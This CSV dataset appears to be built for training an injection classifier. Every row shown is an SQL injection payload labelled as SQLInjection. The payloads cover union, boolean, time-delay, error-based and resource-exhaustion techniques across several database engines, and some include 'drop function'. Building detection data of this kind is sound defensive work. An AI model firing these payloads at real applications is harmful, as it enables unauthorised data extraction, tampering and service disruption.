Sentence,SQLInjection,XSS,Normal
"-3433' )  where 8307 = 8307 union all select 8307,8307,8307,8307,8307,8307,8307,8307--",1,0,0
-3960' or 9323 = 9323#,1,0,0
"-4427'  )  )   union all select 6357,6357,6357,6357,6357#",1,0,0
1 )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and  ( 4968 = 4968,1,0,0
"1'+ ( select 'vfkl' where 1713 = 1713 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  )  +'",1,0,0
"1%""  )  )   union all select null,null,null,null,null,null,null,null,null--",1,0,0
"-7088'|| ( select 'arol' from dual where 8891 = 8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",1,0,0
1  )  )   )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( 8023 = 8023,1,0,0
"1"" where 4672 = 4672",1,0,0
"1"" and make_set ( 8262 = 3471,3471 )  and ""wayp"" = ""wayp",1,0,0
"1""  )  )   )  or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,0,0
"1%"" )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( ""%"" = """,1,0,0
"1""  )  )   )  union all select null,null,null,null#",1,0,0
"1"" )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ( ""hybu"" like ""hybu",1,0,0
"1 )  where 5096 = 5096 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,0,0
" select sleep ( 5 )  and   (  (  ""wueo"" = ""wueo",1,0,0
"1"" where 4183 = 4183 union all select null,null,null,null,null,null--",1,0,0
"1""  )  )   )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( ""htyi"" = ""htyi",1,0,0
"1' )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ",1,0,0
"-5904"" where 9782 = 9782 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1,0,0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (  4982 = 4982,1,0,0
select  ( case when  ( 3499 = 4209 )  then 3499 else 3499* ( select 3499 from mysql.db )  end ) #,1,0,0
select  ( case when  ( 1776 = 7688 )  then 1776 else 1/ ( select 0 )  end ) --,1,0,0
 select sleep ( 5 )  and   (  (  8679 = 8679,1,0,0
"-1823 where 6852 = 6852 union all select 6852,6852,6852,6852,6852,6852#",1,0,0
-9708' where 8150 = 8150 or 6872 = 6872--,1,0,0
"-2639"" )  where 1494 = 1494 union all select 1494--",1,0,0
"-3037""  )  )   )  or elt ( 4758 = 9129,9129 )  and   (  (   ( ""zewv"" like ""zewv",1,0,0
"-4825%' )  union all select 6804,6804,6804,6804,6804,6804,6804--",1,0,0
"1"" where 2221 = 2221 and 5318 = 8398--",1,0,0
"1""  )  )   )  and elt ( 1750 = 7826,7826 )  and   (  (   ( ""qcro"" = ""qcro",1,0,0
-7742 )  as tgzq where 7842 = 7842 or 2062 = 1563,1,0,0
"1'  )  )   as babx where 2494 = 2494 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,0,0
"1'+ ( select wkay where 5476 = 5476 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null  )  )  +'",1,0,0
"1""  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (   ( ""jenb"" like ""jenb",1,0,0
-7624' )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( 'iwab' = 'iwab,1,0,0
"1'|| ( select 'kgjk' where 3530 = 3530 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
1 )  where 6035 = 6035,1,0,0
-1730' or 8571 = 8571--,1,0,0
"1"" procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1,0,0
1' )  where 5491 = 5491 and 9198 = 9198--,1,0,0
"1%'  )  )   and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (  '%' = '",1,0,0
-4058 )  union all select 9184--,1,0,0
"1"" )  where 1614 = 1614 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1,0,0
"1"" where 9521 = 9521 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) --",1,0,0
-9103' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and 'nlvq' = 'nlvq,1,0,0
"1' )  union all select null,null,null,null,null,null,null,null,null--",1,0,0
-1386' )  or  ( 7880 = 5362 ) *5362 and  ( 'vsyu' like 'vsyu,1,0,0
"1  )  )   )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 1164 = 1164",1,0,0
"1  )  )   as atiy where 3855 = 3855 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1,0,0
"1  )  )   as sxhg where 7697 = 7697 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,0,0
1' in boolean mode )  and 5725 = 5552#,1,0,0
1 )  as nbno where 9816 = 9816 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,1,0,0
"1""  )  )   procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (  ""nzhj"" like ""nzhj",1,0,0
"1%' )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ( '%' = '",1,0,0
1'|| ( select 'ucxp' where 6612 = 6612 order by 1--,1,0,0
"-3452%' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and '%' = '",1,0,0
"1 )  where 4226 = 4226 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,0,0
"1""  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( ""vhmc"" = ""vhmc",1,0,0
"1%"" and make_set ( 8403 = 8403,8899 )  and ""%"" = """,1,0,0
"1"" )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ( ""ijop"" = ""ijop",1,0,0
"1"" )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,0,0
-9197' )  or  ( 6877 = 8010 ) *8010 and  ( 'umwl' = 'umwl,1,0,0
"1' )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( 'nlfl' like 'nlfl",1,0,0
-9509'  )  )   )  or 1091 = 5477 and   (  (   ( 'gsmz' = 'gsmz,1,0,0
"1""  )  )   or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  ""lide"" = ""lide",1,0,0
1 )  where 4600 = 4600 or sleep ( 5 ) --,1,0,0
1' )  as ubvf where 5923 = 5923 and 8490 = 4925--,1,0,0
"-1763"" )  or elt ( 1032 = 1032,3623 )  and  ( ""nqvv"" = ""nqvv",1,0,0
 ( select  ( case when  ( 6783 = 6783 )  then 1 else 1/ ( select 0 )  end  )  )  ,1,0,0
1 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1,0,0
1'  )  )   as lkse where 9951 = 9951,1,0,0
"1'  )  )   union all select null,null#",1,0,0
select  ( case when  ( 8841 = 9675 )  then 8841 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,0,0
1%' )  union all select null#,1,0,0
"-4419%""  )  )   or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1,0,0
"1""  )  )   as ecnn where 8913 = 8913 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,0,0
"1"" union all select null--",1,0,0
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and ""azzv"" like ""azzv",1,0,0
"1' )  union all select null,null,null,null#",1,0,0
1' where 9583 = 9583 and 5319 = 7670#,1,0,0
1' )  as tvqn where 2967 = 2967,1,0,0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( ""%"" = """,1,0,0
"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and 'ybjo' = 'ybjo",1,0,0
"1'  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( 'vbda' like 'vbda",1,0,0
"1 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) # myqr",1,0,0
select  ( case when  ( 3217 = 8421 )  then 3217 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,0,0
select  ( case when  ( 6435 = 8988 )  then 6435 else 6435* ( select 6435 from information_schema.character_sets )  end ) #,1,0,0
"1%""  )  )   )  order by 1--",1,0,0
"1"" )  where 7578 = 7578 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,0,0
1' )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'izyf' = 'izyf,1,0,0
1' )  as hwpf where 5603 = 5603,1,0,0
-6843' or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and 'eeff' = 'eeff,1,0,0
1'+ ( select gkve where 1943 = 1943 waitfor delay '0:0:5' ) +',1,0,0
"1'|| ( select 'wgte' from dual where 6316 = 6316 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  ||'",1,0,0
"1 where 1326 = 1326 union all select null,null,null,null,null,null--",1,0,0
1 where 7299 = 7299 rlike sleep ( 5 ) --,1,0,0
"-2889  )  )   as iqzv where 1786 = 1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",1,0,0
"1 where 7932 = 7932 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1,0,0
"1',updatexml ( 2917,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 2917 = 2917,1  )  )   ) ,0x717a767a71 ) ,8295 ) ",1,0,0
1 where 7802 = 7802,1,0,0
1'+ ( select 'ohdf' where 7878 = 7878 and 5678 = 3277--,1,0,0
1' )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and  ( 'svwr' = 'svwr,1,0,0
"1""  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( ""hiwo"" like ""hiwo",1,0,0
1'+ ( select iowv where 6105 = 6105 and sleep ( 5 ) #,1,0,0
"1 where 6369 = 6369 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) --",1,0,0
1 )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) ,1,0,0
"1"" )  as pgza where 8756 = 8756 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
-9331' or  ( 4519 = 2912 ) *2912 and 'rddk' = 'rddk,1,0,0
"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and 'sloy' = 'sloy",1,0,0
"-3177'  )  )   union all select 6500,6500,6500,6500,6500,6500,6500,6500,6500--",1,0,0
"-3130'  )  )   )  union all select 2886,2886,2886,2886,2886,2886,2886#",1,0,0
"1' )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and  ( 'sstt' = 'sstt",1,0,0
if ( 4135 = 2165 )  select 4135 else drop function otyy--,1,0,0
"1%""  )  )   and 6283 = 2068 and   (  (  ""%"" = """,1,0,0
 end and   (  (   ( 'hwrs' like 'hwrs,1,0,0
1 )  as vxsh where 4706 = 4706,1,0,0
-8652' )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ,1,0,0
"1'|| ( select 'ojdz' where 7350 = 7350 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  ||'",1,0,0
"1'|| ( select 'kfyh' where 4737 = 4737 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x  )  )  ||'",1,0,0
 ( select 2527 from pg_sleep ( 5  )  )  ,1,0,0
"1""  )  )   as wwqj where 3249 = 3249 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,0,0
"1  )  )   as acni where 6355 = 6355 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,0,0
"-2766%'  )  )   union all select 4458,4458,4458,4458,4458--",1,0,0
waitfor delay '0:0:5' and   (  (  'yjsp' like 'yjsp,1,0,0
"1'|| ( select 'nzjz' where 3539 = 3539 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,0,0
"-6360' )  as yfrk where 3683 = 3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",1,0,0
"1' in boolean mode )  union all select null,null,null,null--",1,0,0
"select * from generate_series ( 7494,7494,case when  ( 7494 = 7854 )  then 1 else 0 end )  limit 1--",1,0,0
"1' )  or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,0,0
"1"" )  where 7513 = 7513 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1,0,0
"-1600%""  )  )   )  or elt ( 4568 = 7693,7693 )  and   (  (   ( ""%"" = """,1,0,0
if ( 2695 = 9045 )  select 2695 else drop function qmno--,1,0,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and   (  (   ( 7946 = 7946",1,0,0
"1 )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and  ( 5621 = 5621",1,0,0
"1 )  where 5309 = 5309 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,0,0
"1"" where 4213 = 4213 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,0,0
"-1859' union all select 1781,1781,1781,1781#",1,0,0
1' )  where 5214 = 5214,1,0,0
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( '%' = '",1,0,0
"1%'  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( '%' = '",1,0,0
-6081 where 3681 = 3681 or 2603 = 3138--,1,0,0
-1190' or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and 'yxry' like 'yxry,1,0,0
select  ( case when  ( 5203 = 6330 )  then 5203 else 5203* ( select 5203 from mysql.db )  end ) #,1,0,0
1'|| ( select 'lmsc' from dual where 1162 = 1162 order by 1--,1,0,0
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (  ""bhmu"" like ""bhmu",1,0,0
"-6357"" )  order by 1--",1,0,0
"1""  )  )   and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  ""zptu"" = ""zptu",1,0,0
"1 and make_set ( 9681 = 4703,4703 ) # zbrf",1,0,0
"1' )  as sjzi where 8242 = 8242 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,0,0
1'+ ( select rhlb where 9477 = 9477,1,0,0
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  ""%"" = """,1,0,0
"-2216"" )  where 6692 = 6692 union all select 6692,6692,6692#",1,0,0
-6397%' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and '%' = ',1,0,0
"1' )  as afnt where 4719 = 4719 and elt ( 8224 = 1275,1275 ) --",1,0,0
1'  )  )   as rxxd where 5049 = 5049,1,0,0
"1'+ ( select sxco where 1623 = 1623 union all select null,null--",1,0,0
"1"" where 4978 = 4978 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,0,0
1' where 3188 = 3188 and 9198 = 9198--,1,0,0
"1'+ ( select 'eoxk' where 6621 = 6621 union all select null,null#",1,0,0
1 )  as qywz where 1864 = 1864 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --,1,0,0
"1""  )  )   union all select null,null--",1,0,0
"1 where 2988 = 2988 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,0,0
"1' )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( 'mseo' like 'mseo",1,0,0
"1""  )  )   or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  ""vlev"" like ""vlev",1,0,0
1'+ ( select 'rkap' where 9692 = 9692,1,0,0
"1%'  )  )   and elt ( 4249 = 4249,7259 )  and   (  (  '%' = '",1,0,0
"1""  )  )   as qejm where 9014 = 9014 union all select null,null,null,null,null,null#",1,0,0
-9556' )  where 2472 = 2472 or  ( 2883 = 9968 ) *9968--,1,0,0
1 )  as nxmd where 8650 = 8650,1,0,0
-8812 or 6872 = 6872# dflr,1,0,0
1%' and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and '%' = ',1,0,0
"1'  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'iaud' = 'iaud",1,0,0
1 and  ( 3020 = 3020 ) *6703-- zsnl,1,0,0
1  )  )   as rhwg where 8843 = 8843,1,0,0
-2495  )  )   as hudw where 4197 = 4197 or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1,0,0
"-9697 )  union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",1,0,0
"-4068'  )  )   )  union all select 9491,9491,9491--",1,0,0
"1%""  )  )   )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,0,0
"elt ( 5098 = 2728,1 ) ",1,0,0
1' where 7882 = 7882 and 6663 = 4524--,1,0,0
"1%""  )  )   )  union all select null,null,null--",1,0,0
"1""  )  )   as bosq where 4695 = 4695",1,0,0
